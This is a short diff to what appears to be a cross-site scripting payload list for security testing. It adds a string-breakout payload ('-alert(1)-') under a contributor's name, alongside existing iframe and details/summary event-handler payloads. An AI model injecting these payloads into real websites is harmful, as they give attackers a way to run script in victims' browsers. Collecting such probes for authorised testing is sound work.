@@ -58,6 +58,9 @@
 <iframe/onload=alert(1)>
 <iframe src="data:text/html,<script>alert(1)</script>">
 
+# siddharth
+'-alert(1)-'
+
 # Details/Summary XSS
 <details open ontoggle=alert(1)>
 <details ontoggle=alert(1)><summary>xss</summary></details>
